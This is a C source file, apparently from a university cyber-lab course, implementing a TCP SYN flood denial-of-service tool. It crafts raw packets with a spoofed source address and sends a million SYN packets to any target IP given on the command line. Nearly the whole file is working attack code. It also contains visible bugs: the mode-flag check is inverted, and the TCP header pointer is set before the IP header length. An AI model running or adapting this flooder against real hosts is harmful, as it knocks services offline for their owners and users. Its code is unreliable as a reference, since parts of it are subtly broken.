/*
 *  Cyber Laboratory Course Assignment 3
 *  Attacker DDoS program
 *  Copyright (C) 2023  Roy Simanovich and Lidor Keren Yehushua
 *
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <signal.h>
#include <unistd.h>
#include "attck_header.h"

void send_raw_ip_packet(struct iphdr *iph) {
	struct sockaddr_in dest_info;
	int socketfd = INVALID_SOCKET, enable = 1;

	dest_info.sin_family = AF_INET;

	memcpy(&dest_info.sin_addr, &iph->daddr, sizeof(dest_info.sin_addr));

	if ((socketfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == INVALID_SOCKET)
	{
		perror("socket");
		exit(EXIT_FAILURE);
	}

	if (setsockopt(socketfd, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(int)) == INVALID_SOCKET)
	{
		perror("socket");
		exit(EXIT_FAILURE);
	}

	if (sendto(socketfd, iph, ntohs(iph->tot_len), 0, (struct sockaddr *)&dest_info, sizeof(dest_info)) == INVALID_SOCKET)
	{
		perror("sendto");
		exit(EXIT_FAILURE);
	}

	close(socketfd);
}

unsigned short in_cksum(unsigned short *buf, int length){
	unsigned short *w = buf;
	int nleft = length;
	int sum = 0;
	unsigned short temp = 0;

	/*
	 * The algorithm uses a 32 bit accumulator (sum), adds
	 * sequential 16 bit words to it, and at the end, folds back all
	 * the carry bits from the top 16 bits into the lower 16 bits.
	 */
	while (nleft > 1)
	{
		sum += *w++;
		nleft -= 2;
	}

	/* treat the odd byte at the end, if any */
	if (nleft == 1)
	{
		*(unsigned char *)(&temp) = *(unsigned char *)w;
		sum += temp;
	}

	/* add back carry outs from top 16 bits to low 16 bits */
	sum = (sum >> 16) + (sum & 0xffff); // add hi 16 to low 16
	sum += (sum >> 16);					// add carry
	return (unsigned short)(~sum);
}

unsigned short calculate_tcp_checksum(struct iphdr *iph)
{
	struct tcphdr *tcp = (struct tcphdr *)((unsigned char *)iph + sizeof(struct iphdr));

	int tcp_len = ntohs(iph->tot_len) - sizeof(struct iphdr);

	/* pseudo tcp header for the checksum computation */
	struct pseudo_tcp p_tcp;
	memset(&p_tcp, 0x0, sizeof(struct pseudo_tcp));

	memcpy(&p_tcp.saddr, &iph->saddr, sizeof(p_tcp.saddr));
	memcpy(&p_tcp.daddr, &iph->daddr, sizeof(p_tcp.daddr));
	p_tcp.mbz = 0;
	p_tcp.ptcl = IPPROTO_TCP;
	p_tcp.tcpl = htons(tcp_len);
	memcpy(&p_tcp.tcp, tcp, tcp_len);

	return ((unsigned short)in_cksum(((unsigned short *)&p_tcp), (tcp_len + 12)));
}

// Attacked host = 10.9.0.5

int main(int argc, char **argv) {
	int mode = -1;

	if (argc < 2)
	{
		fprintf(stderr, "Usage: %s <target IP> [-cp]\n", *argv);
		return EXIT_FAILURE;
	}

	else if (argc == 3)
	{
		if (strcmp(*(argv + 2), "-c") == 0)
		{
			fprintf(stdout, "C mode\n");
			mode = 1;
		}

		else if (strcmp(*(argv + 2), "-p") != 0)
		{
			fprintf(stdout, "Python mode\n");
			mode = 2;
		}

		else
		{
			fprintf(stderr, "Usage: %s <target IP> [-cp]\n", *argv);
			return EXIT_FAILURE;
		}
	}

	else
	{
		fprintf(stderr, "Usage: %s <target IP> [-cp]\n", *argv);
		return EXIT_FAILURE;
	}

	// Varibles setup and preparation for the attack
	struct iphdr *iph = NULL;
	struct tcphdr *tcph = NULL;
	struct timeval start, end;

	FILE *fp = NULL;

	fp = fopen((mode == 1 ? ATTK_LOG_FILE_C:ATTK_LOG_FILE_P), "w");

	if (fp == NULL)
	{
		perror("fopen");
		return EXIT_FAILURE;
	}

	char buffer[1500] = {0};

	iph = (struct iphdr *)buffer;
	tcph = (struct tcphdr *)(buffer + (iph->ihl * 4));

	iph->version = P_IP_VERSION;
	iph->ihl = P_IP_HL;
	iph->ttl = P_IP_TTL;
	iph->protocol = IPPROTO_TCP;

	if (inet_pton(AF_INET, "1.1.1.1", &iph->saddr) != 1)
	{
		perror("inet_pton");
		return EXIT_FAILURE;
	}

	if (inet_pton(AF_INET, *(argv + 1), &iph->daddr) != 1)
	{
		perror("inet_pton");
		return EXIT_FAILURE;
	}

	iph->tot_len = htons((iph->ihl * 4) + (P_TCP_HL * 4));

	tcph->source = (P_TCP_SPORT != -1 ? htons(P_TCP_SPORT):htons(1024 + (rand() % 64511)));
	tcph->dest = htons(P_TCP_DPORT);
	tcph->seq = (P_TCP_SEQ != -1 ? htonl(P_TCP_SEQ):htonl(rand() % 4294967295));
	tcph->ack_seq = (P_TCP_ACKSEQ != -1 ? htonl(P_TCP_ACKSEQ):htonl(rand() % 4294967295));
	tcph->doff = P_TCP_HL;
	tcph->syn = 1;
	tcph->window = htons(P_TCP_WIN);
	tcph->check = calculate_tcp_checksum(iph);

	size_t count = 0;

	for (size_t i = 1; i <= 100; ++i)
	{
		for (size_t j = 1; j <= 10000; ++j)
		{
			++count;

			gettimeofday(&start, NULL);
			send_raw_ip_packet(iph);
			gettimeofday(&end, NULL);

			double time_taken = ((end.tv_sec - start.tv_sec) * 1000.0) + ((end.tv_usec - start.tv_usec) / 1000.0);

			fprintf(fp, "%lu %f\n", count, time_taken);
		}

		fprintf(stdout, "Completed %lu%%\n", (((double)count / 1000000) * 100));
	}

	fclose(fp);

	return EXIT_SUCCESS;
}
